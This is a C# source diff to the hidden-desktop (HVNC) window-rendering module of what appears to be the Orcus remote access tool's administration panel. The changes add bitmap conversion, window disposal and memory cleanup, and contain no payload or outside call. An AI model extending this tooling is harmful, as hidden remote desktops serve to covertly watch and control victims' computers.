@@ -4,6 +4,7 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
+using System.IO;
 using System.Linq;
 using System.Threading;
 using System.Threading.Tasks;
@@ -11,8 +12,6 @@ using System.Windows;
 using System.Windows.Media;
 using System.Windows.Media.Imaging;
 using Orcus.Administration.Commands.Native;
-using Orcus.Shared.Commands.DropAndExecute;
-using Orcus.Shared.Commands.HVNC;
 using WindowUpdate = Orcus.Shared.Commands.HVNC.WindowUpdate;
 
 namespace Orcus.Administration.Commands.HVNC
@@ -118,12 +117,13 @@ namespace Orcus.Administration.Commands.HVNC
                             //windows which have a lower Z index (and are more visible) get have a higher priority
                             if ((now - window.LastUpdate).TotalSeconds > (i < 4 ? 8 : 14) ||
                                 window.LastUpdate == DateTime.MinValue && !priorityList.ContainsKey(window))
-                                priorityList.Add(window, (visibleWindows.Count - i)*5);
+                                priorityList.Add(window, (visibleWindows.Count - i) * 5);
                         }
                     }
 
                     var windowToRender = priorityList.OrderByDescending(x => x.Value).FirstOrDefault().Key;
                     _requestInformationDelegate(windowToRender?.Handle ?? 0L);
+                    var s = WriteableBitmap;
                 }
 
                 try
@@ -152,6 +152,22 @@ namespace Orcus.Administration.Commands.HVNC
             }
         }
 
+        private Bitmap BitmapFromWriteableBitmap(WriteableBitmap writeBmp)
+        {
+            Bitmap bmp = null;
+            Application.Current.Dispatcher.Invoke(() =>
+            {
+                using (MemoryStream outStream = new MemoryStream())
+                {
+                    BitmapEncoder enc = new BmpBitmapEncoder();
+                    enc.Frames.Add(BitmapFrame.Create((BitmapSource)writeBmp));
+                    enc.Save(outStream);
+                    bmp = new Bitmap(outStream);
+                }
+            });
+            return bmp;
+        }
+
         private void RenderFrame()
         {
             lock (_renderLock)
@@ -166,7 +182,11 @@ namespace Orcus.Administration.Commands.HVNC
                             if (window.Image != null)
                             {
                                 lock (window.RenderLock)
-                                    graphics.DrawImage(window.Image, new System.Drawing.Point(window.X, window.Y));
+                                {
+                                    Bitmap Screen = BitmapFromWriteableBitmap(window.Image);
+                                    System.Drawing.Point p = new System.Drawing.Point(window.X, window.Y);
+                                    graphics.DrawImage(Screen, p);
+                                }
                             }
                         }
 
@@ -178,7 +198,7 @@ namespace Orcus.Administration.Commands.HVNC
                     {
                         WriteableBitmap.Lock();
                         NativeMethods.CopyMemory(WriteableBitmap.BackBuffer, bitmapData.Scan0,
-                            WriteableBitmap.BackBufferStride*finalImage.Height);
+                            WriteableBitmap.BackBufferStride * finalImage.Height);
 
                         WriteableBitmap.AddDirtyRect(new Int32Rect(0, 0, finalImage.Width, finalImage.Height));
                         WriteableBitmap.Unlock();
@@ -187,8 +207,8 @@ namespace Orcus.Administration.Commands.HVNC
                     finalImage.UnlockBits(bitmapData);
                 }
             }
+            GC.Collect();
         }
-
         public void UpdateFailed()
         {
             if (_isDisposed)
@@ -212,12 +232,13 @@ namespace Orcus.Administration.Commands.HVNC
                         Windows.Add(new WindowRenderInfo(windowInformation));
 
                 foreach (var windowToRemove in Windows.Where(x => !windowUpdate.AllWindows.Contains(x.Handle)).ToList()) //ToList is important to allow removing from the list
+                {
                     Windows.Remove(windowToRemove);
+                    windowToRemove.Dispose();
+                }
 
-                Windows =
-                    new List<WindowRenderInfo>(windowUpdate.AllWindows.Where(
-                        x => Windows.Any(y => y.Handle == x))
-                        .Select(x => Windows.FirstOrDefault(y => y.Handle == x)));
+                Windows = new List<WindowRenderInfo>(windowUpdate.AllWindows.Where(x => Windows.Any(y => y.Handle == x))
+                    .Select(x => Windows.FirstOrDefault(y => y.Handle == x)));
                 /*var windowsIndex = 0;
                 for (int i = 0; i < windowUpdate.AllWindows.Count; i++)
                 {
